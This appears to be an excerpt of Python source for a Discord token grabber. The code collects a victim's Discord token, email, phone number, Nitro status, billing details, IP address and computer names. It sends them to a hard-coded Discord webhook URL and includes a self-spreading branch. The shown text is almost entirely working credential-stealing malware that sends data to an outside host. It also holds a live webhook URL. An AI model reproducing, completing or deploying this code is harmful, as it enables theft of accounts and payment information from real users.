...
def getdeveloper():
    dev = "wodx"
    try:
        dev = urlopen(Request("https://pastebin.com/raw/284vgPnD")).read().decode()
    except:
        pass
    return dev
def getip():
...
def main():
                ...
                "fields": [
                    {
                        ...
                        "value": f'Correo Electronico: {email}\nTelefono: {phone}\nNitro: {nitro}\nInformacion de pago: {billing}',
                        "inline": True
                    },
                    {
                        "name": "**Informacion del ordenador**",
                        "value": f'Direccion IP: {ip}\nUsuario: {pc_username}\nNombre del PC: {pc_name}\nLocalizacion del token: {platform}',
                        "inline": True
                    },
                    {
                        "name": "**Token del pelotudo**",
                        "value": "||"+token+"||",
                        "inline": False
                    },
                ],
    ...
    webhook = {
        ...
        "avatar_url": "https://media.discordapp.net/attachments/811035070085202004/811036178971099196/fbc419602e7c73412294e79f54cb7d65.png"
    }
    try:
        urlopen(Request("https://discord.com/api/webhooks/1292867876029468684/9FERLM_55GzmBvOyW8nB36WMUv8Wasp17qsIHoLlUM1vB_rMFt2YzTo_xZdTZDV1ANcK", data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass
    if self_spread:
...
webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1292867876029468684/9FERLM_55GzmBvOyW8nB36WMUv8Wasp17qsIHoLlUM1vB_rMFt2YzTo_xZdTZDV1ANcK', username="Token Grabber") 
